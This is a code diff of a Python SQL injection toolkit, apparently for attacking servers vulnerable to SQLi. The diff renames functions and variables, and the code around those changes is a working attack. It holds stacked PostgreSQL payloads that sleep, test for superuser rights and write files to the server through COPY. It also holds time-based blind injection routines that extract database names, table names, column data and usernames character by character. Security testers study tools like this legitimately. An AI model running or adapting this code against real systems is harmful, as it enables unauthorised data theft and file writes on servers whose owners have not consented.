@@ -7,49 +7,57 @@ Version: 1.0
 Description: Testing for SQL Injections, across multiple servers vulnerable to SQLi. 
 """
 
-import sys
 import requests
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-import subprocess
-import base64
 import time
 
 # Postgress SQLI
-PG_SLEEP = ";select+pg_sleep({num});"																					# Sleeps for num seconds
-PG_IS_SUPERUSER = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep({num})+end;--+"		# Sleeps for num seconds if superuser
-PG_COPY_TO_FILE = ";COPY+(SELECT+$${string}$$)+to+$${path}\\{file}$$;--+"												# Echos 'string' into path\file
+PG_SLEEP = ";select+pg_sleep({SLEEP});"																					# Sleeps for num seconds
+PG_IS_SUPERUSER = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep({SLEEP})+end;--+"		# Sleeps for num seconds if superuser
+PG_COPY_TO_FILE = ";COPY+(SELECT+$${FILECONTENT}$$)+to+$${FILEPATH}\\{FILENAME}$$;--+"												# Echos 'string' into path\file
 
 # SQLi Constants
-NUM = 0
-STRING = 'Hello World!'
-Path = 'C:\\'
+SLEEP = 0
+FILECONTENT = 'Hello World!'
+FILENAME = "test.txt"
+FILEPATH = 'C:\\'
 
 # Setters
-def set_num(value):
-    global NUM
-    NUM = value
+def setSleep(value):
+    """
+    Sets global int SLEEP to int value.
+    """
 
-def set_string(value):
-    global STRING
-    STRING = value
+    global SLEEP
+    SLEEP = value
 
-def set_file(value):
-    global Path
-    Path = value
+def setContent(value):
+    """
+    Sets global string FILECONTENT to string value.
+    """
 
-# Getters
-def get_num():
-    return NUM
+    global FILECONTENT
+    FILECONTENT = value
 
-def get_string():
-    return STRING
+def setName(value):
+    """
+    Sets global string FILENAME to string value.
+    """
 
-def get_path():
-    return Path
+    global FILENAME
+    FILENAME = value
+
+def setPath(value):
+    """
+    Sets global string FILEPATH to string value.
+    """
+
+    global FILEPATH
+    FILEPATH = value
 
 # Blind SQL functions
-def check_request_time(url, string, max_time, proxy=None):
+def checkRequesTime(url, string, max_time, proxy=None):
     """
     Performs a GET request on the concatenated URL and string, and checks if the response time exceeds max_time.
 
@@ -74,7 +82,7 @@ def check_request_time(url, string, max_time, proxy=None):
         print(f"Error occurred: {e}")
         return False
 
-def extract_table_names(url, base_injection, max_time, proxy=None):
+def extractTableNames(url, base_injection, max_time, proxy=None):
     """
     Extracts database table names using time-based SQL injection.
 
@@ -98,7 +106,7 @@ def extract_table_names(url, base_injection, max_time, proxy=None):
             found_char = False
             for char_code in range(32, 126):  # ASCII printable characters
                 payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
-                if check_request_time(url, payload, max_time, proxy):
+                if checkRequesTime(url, payload, max_time, proxy):
                     table_name += chr(char_code)
                     char_index += 1
                     found_char = True
@@ -116,7 +124,7 @@ def extract_table_names(url, base_injection, max_time, proxy=None):
 
     return table_names
 
-def extract_table_data(url, base_injection, table_name, column_name, max_time, proxy=None):
+def extractTableData(url, base_injection, table_name, column_name, max_time, proxy=None):
     """
     Extracts specific rows and columns of a table using time-based SQL injection.
 
@@ -142,7 +150,7 @@ def extract_table_data(url, base_injection, table_name, column_name, max_time, p
             found_char = False
             for char_code in range(32, 126):  # ASCII printable characters
                 payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
-                if check_request_time(url, payload, max_time, proxy):
+                if checkRequesTime(url, payload, max_time, proxy):
                     row_data += chr(char_code)
                     char_index += 1
                     found_char = True
@@ -160,7 +168,7 @@ def extract_table_data(url, base_injection, table_name, column_name, max_time, p
 
     return table_data
 
-def extract_database_names(url, base_injection, max_time, proxy=None):
+def extractDatabaseNames(url, base_injection, max_time, proxy=None):
     """
     Extracts database names using time-based SQL injection.
 
@@ -184,7 +192,7 @@ def extract_database_names(url, base_injection, max_time, proxy=None):
             found_char = False
             for char_code in range(32, 126):  # ASCII printable characters
                 payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
-                if check_request_time(url, payload, max_time, proxy):
+                if checkRequesTime(url, payload, max_time, proxy):
                     db_name += chr(char_code)
                     char_index += 1
                     found_char = True
@@ -202,7 +210,7 @@ def extract_database_names(url, base_injection, max_time, proxy=None):
 
     return database_names
 
-def extract_usernames(url, base_injection, max_time, proxy=None):
+def extractUsernames(url, base_injection, max_time, proxy=None):
     """
     Extracts usernames from the database using time-based SQL injection.
 
@@ -226,7 +234,7 @@ def extract_usernames(url, base_injection, max_time, proxy=None):
             found_char = False
             for char_code in range(32, 126):  # ASCII printable characters
                 payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
-                if check_request_time(url, payload, max_time, proxy):
+                if checkRequesTime(url, payload, max_time, proxy):
                     username += chr(char_code)
                     char_index += 1
                     found_char = True
